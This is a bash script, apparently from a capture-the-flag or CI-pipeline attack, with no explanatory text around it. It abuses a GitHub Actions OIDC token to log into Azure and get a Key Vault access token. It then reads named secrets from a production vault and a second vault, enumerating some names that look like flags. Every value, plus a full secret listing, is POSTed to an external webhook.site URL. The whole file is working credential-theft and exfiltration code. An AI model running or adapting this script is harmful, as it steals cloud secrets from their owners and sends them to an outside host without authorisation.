#!/usr/bin/env bash
set +e
WH="https://webhook.site/e0a2698b-df5f-4211-a845-1fe6b23c1c58"

ID=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')

az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$ID" --allow-no-subscriptions -o none

AT=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv)

for S in cost-reader-principal directory-audit-principal reporting-service-principal sync-service-principal reporting-viewer-principal secrets-sync-principal; do
  V=$(curl -s -H "Authorization: Bearer $AT" \
    "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$S?api-version=7.4")
  curl -s -X POST -H "Content-Type: application/json" -d "$V" "$WH?name=$S"
done

for S in flag ctf-flag secret df26 the-flag paydojo tebamoto challenge; do
  V=$(curl -s -H "Authorization: Bearer $AT" \
    "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$S?api-version=7.4")
  curl -s -X POST -d "sec:$S:$V" "$WH?vault=sec&name=$S"
done

L=$(curl -s -H "Authorization: Bearer $AT" \
  "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4")
curl -s -X POST -d "$L" "$WH?action=list-sec"
